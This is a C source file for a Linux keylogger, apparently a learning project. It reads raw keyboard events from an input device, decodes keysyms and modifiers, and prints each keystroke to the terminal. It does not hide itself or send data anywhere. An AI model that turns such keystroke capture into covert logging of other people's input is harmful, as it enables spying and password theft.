#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <wchar.h>

#include "keylogger.h"
#include "keys.h"
#include "debug.h"
#include <errno.h>
#include <string.h>

static int			loop;

static void 		sigint(int sig)
{
	if (sig == SIGINT)
		loop = 0;
}

static int  		print_keysym(int *key, int state, int *lockers)
{
	static int		modifier = 0;
	int				code;
	int 			type;
	int 			value;

	code = key[modifier];
	type = KTYP(code);
	value = KVAL(code);
	if (type >= syms_size) {
		code = code ^ 0xf000;
		if (code < 0)
			return printf("<(null)>");
		if (code < 0x80)
			return printf("%s", iso646_syms[code]);
		return printf("[%#04x]", code);
	}
	if (type == KT_LETTER)
		type = KT_LATIN;
	if (type < syms_size && value < syms[type].size) {
		if (type == KT_SHIFT)
			return shift_handler(value, state, &modifier);
		if (type == KT_LOCK)
			lock_handler(value, state, &modifier, lockers);
		if (state)
			return printf("%s", syms[type].table[value]);
	}
	if (type == KT_META && value < syms[0].size)
		return printf("<Meta_%s>", syms[0].table[value]);
	if (state)
		return printf("[%#04x]", code);
	return 0;
}

void					keylogger(int keybd, int **key_table)
{
	int					nbread;			// Number of events received at once.
	struct input_event	events[128];	// Events read.
	int					lockers[NR_LOCK];

	for (int i = 0; i < NR_LOCK; i++)
		lockers[i] = 0;
	// for (int i = 0; i < _NSIG; i++)
	// 	signal(i, sigint);
	signal(SIGINT, sigint);
	lockers[6] = get_keystate(1); // capslock state
	// capslock = get_keystate(1);
	// numlock = get_keystate(2);
	loop = 1;
	while (loop)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		// printf("---------------------------------------------------------\n");
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			if (events[i].type == EV_KEY) {
				print_keysym(key_table[events[i].code], events[i].value, lockers);
				fflush(stdout);
			}
			// printf("[%s] ", event[events[i].type].name);
			// if (events[i].type == EV_KEY) {
			// 	printf("%s ", key[events[i].code].name);
			// 	printf("%s ", (events[i].value == 0) ? "OFF" : (events[i].value == 1) ? "ON" : " REPEAT");
			// }
			// else if (events[i].type == EV_MSC) {
			// 	printf("%s ", msc[events[i].code].name);
			// 	printf("%d ", events[i].value);
			// }
			// else if (events[i].type == EV_LED) {
			// 	printf("%s ", led[events[i].code].name);
			// 	printf("%d ", events[i].value);
			// }
			// else {
			// 	printf("%d ", events[i].code);
			// 	printf("%d ", events[i].value);
			// }
			// printf("\n");
		}
		// printf("---------------------------------------------------------\n");
	}
}
